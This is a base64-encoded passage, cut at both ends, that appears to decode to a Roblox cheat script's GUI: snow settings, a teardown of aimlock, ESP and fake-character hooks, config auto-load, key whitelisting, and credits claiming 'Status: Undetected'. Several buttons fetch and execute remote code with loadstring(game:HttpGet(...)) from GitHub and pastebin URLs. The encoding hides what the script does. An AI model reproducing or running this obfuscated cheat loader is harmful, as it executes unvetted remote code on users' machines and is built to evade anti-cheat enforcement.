iAoRGVidWcpIgogICAgICAgICAgICBQYXJ0Vmlld2VyQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgICAgICBTdG9wUGFydFZpZXdlcigpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICBlbmQKCiAgICAtLSBTbm93IENvbG9yIFNldHRpbmdzCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlNldHRpbmdzLCAiU25vdyBTZXR0aW5ncyIsIDExKQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLlNldHRpbmdzLCAiRGlzYWJsZSBTbm93IiwgIkRpc2FibGVTbm93IiwgMTEuMikKICAgIAogICAgZG8KICAgICAgICBsb2NhbCBTbm93Q29udGFpbmVyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgU25vd0NvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDgwKQogICAgICAgIFNub3dDb250YWluZXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBTbm93Q29udGFpbmVyLkxheW91dE9yZGVyID0gMTEuNQogICAgICAgIFNub3dDb250YWluZXIuUGFyZW50ID0gUGFnZXMuU2V0dGluZ3MKICAgICAgICAKICAgICAgICBsb2NhbCBTbm93TGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQogICAgICAgIFNub3dMYXlvdXQuRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5WZXJ0aWNhbAogICAgICAgIFNub3dMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgU25vd0xheW91dC5QYXJlbnQgPSBTbm93Q29udGFpbmVyCiAgICAgICAgCiAgICAgICAgLS0gU25vd2ZsYWtlIGNvbG9yIGJ1dHRvbnMKICAgICAgICBsb2NhbCBGbGFrZVJvdyA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIEZsYWtlUm93LlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRmxha2VSb3cuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBGbGFrZVJvdy5QYXJlbnQgPSBTbm93Q29udGFpbmVyCiAgICAgICAgCiAgICAgICAgbG9jYWwgRmxha2VMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIpCiAgICAgICAgRmxha2VMYXlvdXQuRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsCiAgICAgICAgRmxha2VMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDUpCiAgICAgICAgRmxha2VMYXlvdXQuUGFyZW50ID0gRmxha2VSb3cKICAgICAgICAKICAgICAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVTbm93Rmxha2VCdG4oY29sb3IsIG5hbWUpCiAgICAgICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgIGJ0bi5TaXplID0gVURpbTIubmV3KDAsIDU1LCAwLCAyMikKICAgICAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBjb2xvcgogICAgICAgICAgICBidG4uVGV4dCA9IG5hbWUKICAgICAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICBidG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgICAgIGJ0bi5UZXh0U2l6ZSA9IDgKICAgICAgICAgICAgYnRuLlBhcmVudCA9IEZsYWtlUm93CiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICAgICAgY29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgICAgIGNvcm5lci5QYXJlbnQgPSBidG4KICAgICAgICAgICAgCiAgICAgICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIF9HLlNub3dGbGFrZUNvbG9yID0gY29sb3IKICAgICAgICAgICAgICAgIHVwZGF0ZVNub3dDb2xvcnMoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgY3JlYXRlU25vd0ZsYWtlQnRuKENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpLCAiV2hpdGUiKQogICAgICAgIGNyZWF0ZVNub3dGbGFrZUJ0bihDb2xvcjMuZnJvbVJHQigyNTUsIDIwMCwgMTAwKSwgIk9yYW5nZSIpCiAgICAgICAgY3JlYXRlU25vd0ZsYWtlQnRuKENvbG9yMy5mcm9tUkdCKDEwMCwgMjAwLCAyNTUpLCAiQmx1ZSIpCiAgICAgICAgY3JlYXRlU25vd0ZsYWtlQnRuKENvbG9yMy5mcm9tUkdCKDI1NSwgMTAwLCAyNTUpLCAiUGluayIpCiAgICAgICAgCiAgICAgICAgLS0gQmFja2dyb3VuZCBjb2xvciBidXR0b25zCiAgICAgICAgbG9jYWwgQmdSb3cgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgICAgICBCZ1Jvdy5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgIEJnUm93LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgQmdSb3cuUGFyZW50ID0gU25vd0NvbnRhaW5lcgogICAgICAgIAogICAgICAgIGxvY2FsIEJnTGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQogICAgICAgIEJnTGF5b3V0LkZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uSG9yaXpvbnRhbAogICAgICAgIEJnTGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA1KQogICAgICAgIEJnTGF5b3V0LlBhcmVudCA9IEJnUm93CiAgICAgICAgCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gY3JlYXRlU25vd0JnQnRuKGNvbG9yLCBuYW1lKQogICAgICAgICAgICBsb2NhbCBidG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgICAgICBidG4uU2l6ZSA9IFVEaW0yLm5ldygwLCA1NSwgMCwgMjIpCiAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gY29sb3IKICAgICAgICAgICAgYnRuLlRleHQgPSBuYW1lCiAgICAgICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgYnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgICAgICBidG4uVGV4dFNpemUgPSA4CiAgICAgICAgICAgIGJ0bi5QYXJlbnQgPSBCZ1JvdwogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICAgICAgICAgIGNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKQogICAgICAgICAgICBjb3JuZXIuUGFyZW50ID0gYnRuCiAgICAgICAgICAgIAogICAgICAgICAgICBidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBfRy5Tbm93QmFja2dyb3VuZENvbG9yID0gY29sb3IKICAgICAgICAgICAgICAgIHVwZGF0ZVNub3dDb2xvcnMoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgY3JlYXRlU25vd0JnQnRuKENvbG9yMy5mcm9tUkdCKDEwLCAxMCwgMTUpLCAiRGFyayIpCiAgICAgICAgY3JlYXRlU25vd0JnQnRuKENvbG9yMy5mcm9tUkdCKDAsIDAsIDUwKSwgIk5hdnkiKQogICAgICAgIGNyZWF0ZVNub3dCZ0J0bihDb2xvcjMuZnJvbVJHQig1MCwgMCwgNTApLCAiUHVycGxlIikKICAgICAgICBjcmVhdGVTbm93QmdCdG4oQ29sb3IzLmZyb21SR0IoMCwgNTAsIDUwKSwgIlRlYWwiKQogICAgICAgIGNyZWF0ZVNub3dCZ0J0bihDb2xvcjMuZnJvbVJHQigxMDAsIDUwLCAwKSwgIkJyb3duIikKICAgICAgICBjcmVhdGVTbm93QmdCdG4oQ29sb3IzLmZyb21SR0IoMCwgMCwgMCksICJCbGFjayIpCiAgICBlbmQKICAgIAogICAgZG8KICAgIGxvY2FsIFNwYWNlciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgU3BhY2VyLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTApIC0tIEVzcGFjZSBwb3VyIHBvdXNzZXIgbGUgYm91dG9uIHZlcnMgbGUgYmFzCiAgICBTcGFjZXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFNwYWNlci5MYXlvdXRPcmRlciA9IDEyCiAgICBTcGFjZXIuUGFyZW50ID0gUGFnZXMuU2V0dGluZ3MKICAgIAogICAgbG9jYWwgRGlzY29ubmVjdEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBEaXNjb25uZWN0QnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICBEaXNjb25uZWN0QnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgRGlzY29ubmVjdEJ0bi5UZXh0ID0gIkRJU0NPTk5FQ1QiCiAgICBEaXNjb25uZWN0QnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgRGlzY29ubmVjdEJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIERpc2Nvbm5lY3RCdG4uVGV4dFNpemUgPSAxMAogICAgRGlzY29ubmVjdEJ0bi5MYXlvdXRPcmRlciA9IDEzCiAgICBEaXNjb25uZWN0QnRuLlBhcmVudCA9IFBhZ2VzLlNldHRpbmdzCiAgICAKICAgIGxvY2FsIERDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KSBEQ29ybmVyLlBhcmVudCA9IERpc2Nvbm5lY3RCdG4KICAgIAogICAgRGlzY29ubmVjdEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBDb25maWcuSXNSdW5uaW5nID0gZmFsc2UKICAgICAgICBpZiBkZWxmaWxlIGFuZCBpc2ZpbGUgYW5kIGlzZmlsZSgiQ3liZXJwdW5rc19LZXkudHh0IikgdGhlbgogICAgICAgICAgICBkZWxmaWxlKCJDeWJlcnB1bmtzX0tleS50eHQiKQogICAgICAgIGVuZAogICAgICAgIC0tIENsZWFudXAKICAgICAgICBpZiBTY3JlZW5HdWkgdGhlbiBTY3JlZW5HdWk6RGVzdHJveSgpIGVuZAogICAgICAgIGlmIEVTUEZvbGRlciB0aGVuIEVTUEZvbGRlcjpEZXN0cm95KCkgZW5kCiAgICAgICAgaWYgTWluaW1pemVkR3VpIHRoZW4gTWluaW1pemVkR3VpOkRlc3Ryb3koKSBlbmQKICAgICAgICBpZiBCcm9hZGNhc3RHdWkgdGhlbiBCcm9hZGNhc3RHdWk6RGVzdHJveSgpIGVuZAogICAgICAgIAogICAgICAgIGZvciBfLCBjb25uIGluIHBhaXJzKENvbm5lY3Rpb25zKSBkbyBpZiBjb25uIHRoZW4gY29ubjpEaXNjb25uZWN0KCkgZW5kIGVuZAogICAgICAgIHRhYmxlLmNsZWFyKENvbm5lY3Rpb25zKQogICAgICAgIAogICAgICAgIGlmIGZha2VDaGFyIHRoZW4gZmFrZUNoYXI6RGVzdHJveSgpIGVuZAogICAgICAgIGlmIG1vdmVyUGFydCB0aGVuIG1vdmVyUGFydDpEZXN0cm95KCkgZW5kCiAgICAgICAgaWYgRk9WQ2lyY2xlIHRoZW4gcGNhbGwoZnVuY3Rpb24oKSBGT1ZDaXJjbGU6UmVtb3ZlKCkgZW5kKSBlbmQKICAgICAgICAKICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgaHVtYW5vaWQuUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4gcm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiByZWFjaENvbm5lY3Rpb24gdGhlbiByZWFjaENvbm5lY3Rpb246RGlzY29ubmVjdCgpIGVuZAogICAgICAgIGlmIGFudGlMYXZhQ29ubmVjdGlvbiB0aGVuIGFudGlMYXZhQ29ubmVjdGlvbjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgaWYgcG90YXRvQ29ubmVjdGlvbiB0aGVuIHBvdGF0b0Nvbm5lY3Rpb246RGlzY29ubmVjdCgpIGVuZAogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgUnVuU2VydmljZTpVbmJpbmRGcm9tUmVuZGVyU3RlcCgiQWltTG9ja1ByaW9yaXR5IikgZW5kKQogICAgICAgIAogICAgICAgIGlmIFNob3dLZXlTeXN0ZW0gdGhlbiBTaG93S2V5U3lzdGVtKCkgZW5kCiAgICBlbmQpCiAgICBlbmQKICAgIAogICAgLS0gQXR0ZW1wdCBBdXRvIExvYWQgb24gU3RhcnR1cAogICAgdGFzay53YWl0KDAuNSkKICAgIGlmIGlzZmlsZSBhbmQgaXNmaWxlKCJDeWJlcnB1bmtzX0xvYWRlci5qc29uIikgYW5kIHJlYWRmaWxlIHRoZW4KICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGRhdGEgPSBIdHRwU2VydmljZTpKU09ORGVjb2RlKHJlYWRmaWxlKCJDeWJlcnB1bmtzX0xvYWRlci5qc29uIikpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBkYXRhLkRpc2FibGVTbm93IH49IG5pbCB0aGVuCiAgICAgICAgICAgICAgICBDb25maWcuRGlzYWJsZVNub3cgPSBkYXRhLkRpc2FibGVTbm93CiAgICAgICAgICAgICAgICBpZiBfRy5Tbm93R3VpIHRoZW4KICAgICAgICAgICAgICAgICAgICBfRy5Tbm93R3VpLkVuYWJsZWQgPSBub3QgQ29uZmlnLkRpc2FibGVTbm93CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkRpc2FibGVTbm93Il0gdGhlbgogICAgICAgICAgICAgICAgICAgIFRvZ2dsZUJ1dHRvbnNbIkRpc2FibGVTbm93Il0uQmFja2dyb3VuZENvbG9yMyA9IENvbmZpZy5EaXNhYmxlU25vdyBhbmQgQ3VycmVudFRoZW1lQ29sb3Igb3IgQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEhhbmRsZSBBdXRvIExvYWQgQ29uZmlnCiAgICAgICAgICAgIGlmIGRhdGEgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgc2F2ZWRBdXRvTG9hZCA9IGRhdGEuRW5hYmxlZAogICAgICAgICAgICAgICAgbG9jYWwgc2F2ZWRDb25maWdOYW1lID0gZGF0YS5Db25maWdOYW1lCgogICAgICAgICAgICAgICAgaWYgc2F2ZWRDb25maWdOYW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICBDb25maWcuQXV0b0xvYWRDb25maWdOYW1lID0gc2F2ZWRDb25maWdOYW1lCiAgICAgICAgICAgICAgICAgICAgaWYgSW5wdXRCb3hlc1siQXV0b0xvYWRDb25maWdOYW1lIl0gdGhlbiBJbnB1dEJveGVzWyJBdXRvTG9hZENvbmZpZ05hbWUiXS5UZXh0ID0gc2F2ZWRDb25maWdOYW1lIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHNhdmVkQXV0b0xvYWQgfj0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICBDb25maWcuQXV0b0xvYWRDb25maWcgPSBzYXZlZEF1dG9Mb2FkCiAgICAgICAgICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siQXV0b0xvYWRDb25maWciXSB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICBUb2dnbGVCdXR0b25zWyJBdXRvTG9hZENvbmZpZyJdLkJhY2tncm91bmRDb2xvcjMgPSBzYXZlZEF1dG9Mb2FkIGFuZCBDdXJyZW50VGhlbWVDb2xvciBvciBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKSAKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBDb25maWcuQXV0b0xvYWRDb25maWcgYW5kIENvbmZpZy5BdXRvTG9hZENvbmZpZ05hbWUgfj0gIiIgdGhlbgogICAgICAgICAgICAgICAgICAgIExvYWRDb25maWcoQ29uZmlnLkF1dG9Mb2FkQ29uZmlnTmFtZSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBSZXN0b3JlIExvYWRlciBTZXR0aW5ncyAoVUkgJiBDb25maWcpCiAgICAgICAgICAgICAgICAgICAgaWYgc2F2ZWRDb25maWdOYW1lIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkF1dG9Mb2FkQ29uZmlnTmFtZSA9IHNhdmVkQ29uZmlnTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBJbnB1dEJveGVzWyJBdXRvTG9hZENvbmZpZ05hbWUiXSB0aGVuIElucHV0Qm94ZXNbIkF1dG9Mb2FkQ29uZmlnTmFtZSJdLlRleHQgPSBzYXZlZENvbmZpZ05hbWUgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgc2F2ZWRBdXRvTG9hZCB+PSBuaWwgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBDb25maWcuQXV0b0xvYWRDb25maWcgPSBzYXZlZEF1dG9Mb2FkCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkF1dG9Mb2FkQ29uZmlnIl0gdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRvZ2dsZUJ1dHRvbnNbIkF1dG9Mb2FkQ29uZmlnIl0uQmFja2dyb3VuZENvbG9yMyA9IHNhdmVkQXV0b0xvYWQgYW5kIEN1cnJlbnRUaGVtZUNvbG9yIG9yIENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApIAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBTZXR1cEF1dG9Mb2FkKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLkNyZWRpdHMsICJJbmZvcm1hdGlvbiIsIDEpCiAgICBjcmVhdGVJbmZvKFBhZ2VzLkNyZWRpdHMsICJEZXZlbG9wZWQgYnkgQ3liZXJwdW5rcyBUZWFtIiwgMikKICAgIGNyZWF0ZUluZm8oUGFnZXMuQ3JlZGl0cywgIlZlcnNpb246IDEwLjcgU3RhYmxlIiwgMykKICAgIGNyZWF0ZUluZm8oUGFnZXMuQ3JlZGl0cywgIlN0YXR1czogVW5kZXRlY3RlZCIsIDQpCgogICAgLS0gQ3VzdG9tIFBhZ2UgQ29udGVudAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5DdXN0b20sICJPdGhlciBTY3JpcHRzIiwgMSkKCiAgICBkbwogICAgICAgIGxvY2FsIFVuaXZlcnNhbEd1bkJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgVW5pdmVyc2FsR3VuQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgVW5pdmVyc2FsR3VuQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIFVuaXZlcnNhbEd1bkJ0bi5UZXh0ID0gIlVuaXZlcnNhbCBHdW4gU2NyaXB0IiAuLiAoQ29uZmlnLklzV2hpdGVsaXN0ZWQgYW5kICIiIG9yICIg8J+UkiIpCiAgICAgICAgVW5pdmVyc2FsR3VuQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgICAgIFVuaXZlcnNhbEd1bkJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBVbml2ZXJzYWxHdW5CdG4uVGV4dFNpemUgPSAxMAogICAgICAgIFVuaXZlcnNhbEd1bkJ0bi5MYXlvdXRPcmRlciA9IDEuMQogICAgICAgIFVuaXZlcnNhbEd1bkJ0bi5QYXJlbnQgPSBQYWdlcy5DdXN0b20KICAgICAgICBsb2NhbCBjMyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjMy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLDQpIGMzLlBhcmVudCA9IFVuaXZlcnNhbEd1bkJ0bgogICAgICAgIFVuaXZlcnNhbEd1bkJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Jc1doaXRlbGlzdGVkIHRoZW4gU2VuZE5vdGlmaWNhdGlvbigiWW91ciBrZXkgaXMgbm90IHdoaXRlbGlzdGVkLCB5b3UgY2Fubm90IHVzZSB0aGlzIG9wdGlvbiIsIDMpIHJldHVybiBlbmQKICAgICAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ibGFja293bDEyMzEvWjNVUy9yZWZzL2hlYWRzL21haW4vbWFpbi5sdWEiKSkoKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGRvCiAgICAgICAgbG9jYWwgQmxhZGVCYWxsQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBCbGFkZUJhbGxCdG4uU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgICAgICBCbGFkZUJhbGxCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgQmxhZGVCYWxsQnRuLlRleHQgPSAiT3AgQmxhZGUgQmFsbCIgLi4gKENvbmZpZy5Jc1doaXRlbGlzdGVkIGFuZCAiIiBvciAiIPCflJIiKQogICAgICAgIEJsYWRlQmFsbEJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBCbGFkZUJhbGxCdG4uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICAgICAgQmxhZGVCYWxsQnRuLlRleHRTaXplID0gMTAKICAgICAgICBCbGFkZUJhbGxCdG4uTGF5b3V0T3JkZXIgPSAxLjIKICAgICAgICBCbGFkZUJhbGxCdG4uUGFyZW50ID0gUGFnZXMuQ3VzdG9tCiAgICAgICAgbG9jYWwgYzQgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgYzQuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCw0KSBjNC5QYXJlbnQgPSBCbGFkZUJhbGxCdG4KICAgICAgICBCbGFkZUJhbGxCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBDb25maWcuSXNXaGl0ZWxpc3RlZCB0aGVuIFNlbmROb3RpZmljYXRpb24oIllvdXIga2V5IGlzIG5vdCB3aGl0ZWxpc3RlZCwgeW91IGNhbm5vdCB1c2UgdGhpcyBvcHRpb24iLCAzKSByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQWdlbnRYNzcxL0FyZ29uSHViWC9tYWluL0xvYWRlci5sdWEiKSkoKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGRvCiAgICAgICAgbG9jYWwgUGFzdGViaW5CdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIFBhc3RlYmluQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgUGFzdGViaW5CdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAg" .. "ICAgICAgUGFzdGViaW5CdG4uVGV4dCA9ICJTdGFsayBTY3JpcHQiIC4uIChDb25maWcuSXNXaGl0ZWxpc3RlZCBhbmQgIiIgb3IgIiDwn5SSIikKICAgICAgICBQYXN0ZWJpbkJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBQYXN0ZWJpbkJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBQYXN0ZWJpbkJ0bi5UZXh0U2l6ZSA9IDEwCiAgICAgICAgUGFzdGViaW5CdG4uTGF5b3V0T3JkZXIgPSAxLjMKICAgICAgICBQYXN0ZWJpbkJ0bi5QYXJlbnQgPSBQYWdlcy5DdXN0b20KICAgICAgICBsb2NhbCBjNSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKSBjNS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLDQpIGM1LlBhcmVudCA9IFBhc3RlYmluQnRuCiAgICAgICAgUGFzdGViaW5CdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBDb25maWcuSXNXaGl0ZWxpc3RlZCB0aGVuIFNlbmROb3RpZmljYXRpb24oIllvdXIga2V5IGlzIG5vdCB3aGl0ZWxpc3RlZCwgeW91IGNhbm5vdCB1c2UgdGhpcyBvcHRpb24iLCAzKSByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcva0RBODc1YkYiKSkoKQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuQ3VzdG9tLCAiRmVhdHVyZXMiLCAyKQogICAgZG8KICAgICAgICBsb2NhbCBGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMjUpCiAgICAgICAgRnJhbWUuTGF5b3V0T3JkZXIgPSAyLjEKICAgICAgICBGcmFtZS5QYXJlbnQgPSBQYWdlcy5DdXN0b20KCiAgICAgICAgbG9jYWwgQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKSBDb3JuZXIuUGFyZW50ID0gRnJhbWUKICAgICAgICBsb2NhbCBTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikgU3Ryb2tlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMzUsIDM1LCA0NSkgU3Ryb2tlLlRoaWNrbmVzcyA9IDEgU3Ryb2tlLlBhcmVudCA9IEZyYW1lCgogICAgICAgIGxvY2FsIExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgIExhYmVsLlRleHQgPSAiU2tpbiBHbGl0Y2ggKDIuMDYpIiAuLiAoQ29uZmlnLklzV2hpdGVsaXN0ZWQgYW5kICIiIG9yICIg8J+UkiIpCiAgICAgICAgTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjcsIDAsIDEsIDApCiAgICAgICAgTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAwLCAyMDAsIDIwMCkKICAgICAgICBMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbU1lZGl1bQogICAgICAgIExhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgTGFiZWwuVG